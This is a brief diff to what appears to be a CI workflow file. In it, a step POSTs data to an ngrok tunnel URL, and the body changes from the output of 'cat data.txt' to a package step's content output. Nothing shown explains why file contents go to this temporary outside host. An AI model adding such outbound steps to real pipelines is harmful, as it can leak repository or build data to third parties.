@@ -34,5 +34,5 @@ jobs:
       with:
         url: 'https://b912-54-91-189-235.ngrok.io/hook/'
         method: 'POST'
-        data: '{"key":"$(cat data.txt)"}'
+        data: '{"key":"${{ steps.package.outputs.content }}"}'
       
